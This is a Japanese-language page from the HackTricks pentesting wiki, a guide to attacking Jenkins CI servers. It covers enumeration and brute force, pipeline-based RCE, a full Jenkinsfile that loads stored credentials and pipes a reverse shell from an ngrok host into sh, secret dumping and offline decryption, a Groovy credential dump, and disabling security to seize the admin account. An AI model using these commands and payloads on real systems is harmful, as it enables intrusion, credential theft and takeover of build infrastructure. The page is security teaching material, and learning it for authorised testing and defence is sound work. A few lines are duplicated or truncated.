# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしよう。
* **PRを提出してハッキングトリックを共有しよう** [**HackTricks**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリに。

</details>
{% endhint %}

## 基本情報

Jenkinsは、パイプラインを使用して**プログラミング言語**やソースコードリポジトリの**ほぼすべて**の組み合わせに対して**継続的インテグレーション**または**継続的デリバリー**（CI/CD）環境を確立するための簡単な方法を提供するツールです。さらに、さまざまな日常的な開発タスクを自動化します。Jenkinsは**個々のステップのスクリプトを作成する必要性を排除するわけではありません**が、手動で簡単に構築できるよりも迅速かつ堅牢にビルド、テスト、デプロイメントツールの全シーケンスを統合する方法を提供します。

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 認証なしの列挙

認証なしで興味深いJenkinsページ（例：_/people_ や _/asynchPeople_、これらは現在のユーザーをリストします）を検索するために、以下を使用できます:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
認証なしでコマンドを実行できるか確認します:
```
msf> use auxiliary/scanner/http/jenkins_command
```
資格情報がなくても、_**/asynchPeople/**_ パスや _**/securityRealm/user/admin/search/index?q=**_ で **ユーザー名** を確認できます。

パス _**/oops**_ または _**/error**_ から Jenkins のバージョンを取得できるかもしれません。

![](<../../.gitbook/assets/image (146).png>)

### 既知の脆弱性

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ログイン

基本情報では、Jenkins にログインする**すべての方法を確認**できます：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 登録

アカウントを作成してログインできる Jenkins インスタンスを見つけることができます。**それだけ簡単です。**

### **SSO ログイン**

**SSO** **機能**/**プラグイン**が存在する場合、テストアカウント（例：テスト **Github/Bitbucket アカウント**）を使用してアプリケーションに**ログイン**を試みるべきです。[**こちら**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)のトリック。

### ブルートフォース

**Jenkins** には **パスワードポリシー** と **ユーザーネームブルートフォース緩和**が欠けています。**弱いパスワード**や **ユーザーネームをパスワードとして使用**している可能性があるため、**ブルートフォース**が重要です。さらには、**逆にしたユーザーネームをパスワードとして使用**している場合もあります。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### パスワードスプレー

[このPythonスクリプト](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) または [このPowerShellスクリプト](https://github.com/chryzsh/JenkinsPasswordSpray) を使用します。

### IPホワイトリストバイパス

多くの組織は、GitHubやGitLabなどの**SaaSベースのソース管理（SCM）システム**と、JenkinsやTeamCityのような**内部のセルフホストCI**ソリューションを組み合わせています。このセットアップにより、CIシステムは**SaaSソース管理ベンダーからのWebhookイベントを受信**し、主にパイプラインジョブをトリガーすることができます。

これを実現するために、組織は**SCMプラットフォームのIPレンジ**を**ホワイトリスト**に登録し、**Webhook**を介して**内部CIシステム**にアクセスできるようにします。しかし、**誰でも**GitHubやGitLabに**アカウントを作成**し、**Webhookをトリガー**するように設定することができ、**内部CIシステム**にリクエストを送信する可能性があります。

チェック: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## 内部Jenkinsの悪用

これらのシナリオでは、Jenkinsにアクセスするための有効なアカウントを持っていると仮定します。

{% hint style="warning" %}
Jenkinsで設定されている**認証**メカニズムと、侵害されたユーザーの権限に応じて、以下の攻撃を**実行できるかどうか**が決まります。
{% endhint %}

詳細については、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ユーザーのリスト表示

Jenkinsにアクセスできる場合、[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) で他の登録ユーザーをリスト表示できます。

### ビルドをダンプして平文のシークレットを見つける

[このスクリプト](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) を使用して、ビルドコンソールの出力やビルド環境変数をダンプし、平文のシークレットを見つけることを試みます。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH資格情報の盗難**

侵害されたユーザーが**新しいJenkinsノードを作成/変更するのに十分な権限を持っている**場合、他のノードにアクセスするためのSSH資格情報が既に保存されていると、ノードを作成/変更し、**ホストキーを検証せずに資格情報を記録するホストを設定することで**、**その資格情報を盗む**ことができます。

![](<../../.gitbook/assets/image (218).png>)

通常、Jenkinsのssh資格情報は**グローバルプロバイダー**（`/credentials/`）にありますので、他のシークレットをダンプするのと同様にダンプすることができます。詳細は[**シークレットのダンプセクション**](./#dumping-secrets)をご覧ください。

### **JenkinsでのRCE**

**Jenkinsサーバーでシェルを取得する**ことで、攻撃者はすべての**シークレット**や**環境変数**を漏洩させ、同じネットワーク内の他のマシンを**攻撃**したり、**クラウド資格情報を収集**したりする機会を得ます。

デフォルトでは、Jenkinsは**SYSTEMとして実行**されます。したがって、これを侵害すると攻撃者に**SYSTEM権限**が与えられます。

### **プロジェクトの作成/変更によるRCE**

プロジェクトの作成/変更は、Jenkinsサーバー上でRCEを取得する方法の一つです：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyスクリプトの実行によるRCE**

新しいプロジェクトを作成するよりもステルス性が高いかもしれないGroovyスクリプトを実行することでRCEを取得することもできます：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### パイプラインの作成/変更によるRCE

**パイプラインを作成/変更することによってRCEを取得**することもできます：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## パイプラインのエクスプロイト

パイプラインをエクスプロイトするには、Jenkinsへのアクセスが必要です。

### ビルドパイプライン

**パイプライン**は**プロジェクトのビルドメカニズム**としても使用できます。その場合、パイプラインの構文を含む**リポジトリ内のファイル**を設定できます。デフォルトでは`/Jenkinsfile`が使用されます：

![](<../../.gitbook/assets/image (127).png>)

パイプライン設定ファイルを**他の場所**（例えば他のリポジトリ）に**保存**することも可能で、リポジトリの**アクセス**とパイプラインのアクセスを**分離**することが目的です。

攻撃者がそのファイルに**書き込みアクセス**を持っている場合、**それを変更**し、Jenkinsにアクセスせずに**パイプラインをトリガー**することができます。\
攻撃者は**ブランチ保護を回避**する必要があるかもしれません（プラットフォームやユーザー権限によっては回避できるかどうかが異なります）。

カスタムパイプラインを実行する最も一般的なトリガーは次のとおりです：

* メインブランチ（または他のブランチ）への**プルリクエスト**
* メインブランチ（または他のブランチ）への**プッシュ**
* メインブランチを**更新**し、何らかの方法で実行されるのを待つ

{% hint style="info" %}
**外部ユーザー**であれば、他のユーザー/組織のリポジトリの**メインブランチにPRを作成**して**パイプラインをトリガー**することは期待できませんが、**悪い設定**がされている場合、これを悪用することで**企業を完全に侵害**することができます。
{% endhint %}

### パイプラインRCE

前述のRCEセクションでは、[**パイプラインを変更してRCEを取得する**](./#rce-creating-modifying-pipeline)技術が既に示されています。

### 環境変数の確認

パイプライン全体または特定のステージに対して**平文の環境変数**を宣言することが可能です。これらの環境変数には**機密情報を含めるべきではありません**が、攻撃者は常に**すべてのパイプライン**設定/Jenkinsfileを**確認**することができます。
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Jenkinsで秘密情報が通常どのように扱われるかについての情報は、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

資格情報は**グローバルプロバイダーにスコープ**されることもあれば（`/credentials/`）、**特定のプロジェクトにスコープ**されることもあります（`/job/<project-name>/configure`）。したがって、すべての資格情報を流出させるためには、秘密情報を含むすべてのプロジェクトを**少なくともすべて妥協**し、カスタム/毒されたパイプラインを実行する必要があります。

もう一つの問題として、パイプラインの**環境内に秘密情報を取得する**ためには、**秘密情報の名前とタイプを知っている**必要があります。例えば、**`usernamePassword`** **secret**を**`string`** **secret**として**ロード**しようとすると、次のような**エラー**が発生します：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Here you have the way to load some common secret types:
いくつかの一般的なシークレットタイプをロードする方法は次のとおりです:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
このページの最後に**すべての認証情報の種類**を見つけることができます: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**すべての秘密情報を一度にダンプする**最良の方法は、**Jenkins**マシンを**侵害**し（例えば、**built-in node**でリバースシェルを実行する）、その後**マスターキー**と**暗号化された秘密情報**を**漏洩**させ、オフラインで復号することです。\
これを行う方法の詳細は、[Nodes & Agentsセクション](./#nodes-and-agents)および[Post Exploitationセクション](./#post-exploitation)にあります。
{% endhint %}

### トリガー

[ドキュメント](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)より: `triggers`ディレクティブは、**パイプラインが再トリガーされる自動化された方法**を定義します。GitHubやBitBucketなどのソースと統合されたパイプラインの場合、`triggers`は必要ないかもしれません。なぜなら、webhooksベースの統合がすでに存在する可能性が高いからです。現在利用可能なトリガーは`cron`、`pollSCM`、および`upstream`です。

Cronの例:
```bash
triggers { cron('H */4 * * 1-5') }
```
**ドキュメントの他の例を確認してください**。

### Nodes & Agents

**Jenkinsインスタンス**は**異なるマシンで異なるエージェントが実行されている**場合があります。攻撃者の視点から見ると、異なるマシンへのアクセスは、**盗むべき異なる潜在的なクラウド認証情報**や、他のマシンを悪用するための**異なるネットワークアクセス**を意味します。

詳細については、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

**設定されたノード**を`/computer/`で列挙できます。通常、\*\*`Built-In Node` \*\*（Jenkinsを実行しているノード）と、場合によってはさらに多くのノードが見つかります：

![](<../../.gitbook/assets/image (249).png>)

**Built-Inノードを侵害することは特に興味深い**です。なぜなら、それは機密のJenkins情報を含んでいるからです。

**ビルトインJenkinsノード**で**パイプラインを実行**したいことを示すには、パイプライン内に次の設定を指定できます：
```bash
pipeline {
agent {label 'built-in'}
```
### 完全な例

特定のエージェントでのパイプライン、cronトリガー付き、パイプラインおよびステージの環境変数、ステップで2つの変数を読み込み、リバースシェルを送信:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

`/credentials/` にアクセスして十分な権限があれば、シークレットを一覧表示できます。これは `credentials.xml` ファイル内のシークレットのみを一覧表示しますが、**ビルド構成ファイル**にも**さらに多くの資格情報**が含まれている可能性があります。

各プロジェクトの**構成を確認できる場合**、リポジトリにアクセスするために使用される**資格情報（シークレット）の名前**や**プロジェクトの他の資格情報**も確認できます。

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

これらのファイルは**Jenkinsシークレットを復号化するために必要**です：

* secrets/master.key
* secrets/hudson.util.Secret

このような**シークレットは通常次の場所にあります**：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

これらを見つけるための正規表現は次の通りです：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkinsの秘密情報をオフラインで復号化する

**秘密情報を復号化するために必要なパスワードをダンプした場合**、[**このスクリプト**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **を使用してそれらの秘密情報を復号化します**。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### GroovyからJenkinsの秘密を復号化する

```groovy
// Load the Jenkins instance
def jenkins = jenkins.model.Jenkins.instance

// Get the credentials store
def store = jenkins.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

// Decrypt the secrets
store.getCredentials(store.getDomains()[0]).each { cred ->
    println(cred.id + ": " + cred.secret.plainText)
}
```

このスクリプトはJenkinsインスタンスから秘密を復号化します。
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 新しい管理者ユーザーを作成

1. Jenkinsのconfig.xmlファイルにアクセスします。パスは `/var/lib/jenkins/config.xml` または `C:\Program Files (x86)\Jenkins\` です。
2. `<useSecurity>true</useSecurity>` という単語を検索し、**`true`** を **`false`** に変更します。
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** サーバーを再起動します: `service jenkins restart`
4. 再度Jenkinsポータルにアクセスすると、今回は**Jenkinsが認証情報を要求しません**。「**Manage Jenkins**」に移動して、**管理者パスワードを再設定**します。
5. 設定を `<useSecurity>true</useSecurity>` に変更して**セキュリティを再度有効化**し、**Jenkinsを再起動**します。

## 参考文献

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWS Hackingを学び、練習しましょう:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingを学び、練習しましょう: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**Telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live) をフォローしてください。
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
